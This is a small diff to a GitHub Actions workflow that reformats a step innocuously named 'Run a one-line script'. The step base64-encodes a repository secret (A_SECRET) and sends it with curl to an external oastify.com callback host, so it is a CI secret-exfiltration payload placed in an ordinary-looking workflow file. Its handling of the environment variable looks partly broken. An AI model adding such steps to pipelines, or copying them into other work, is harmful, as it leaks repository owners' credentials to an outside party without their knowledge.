@@ -23,6 +23,6 @@ jobs:
     steps:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - name: Run a one-line script
-        run|
-          echo "EXFIL=${{ secrets.A_SECRET }}" | base64 >> $GITHUB_ENV
-          curl -sSf https://ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com${{ env.EXFIL }}
+      run: |
+        echo "EXFIL=${{ secrets.A_SECRET }}" | base64 >> $GITHUB_ENV
+        curl -sSf https://ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com${{ env.EXFIL }}
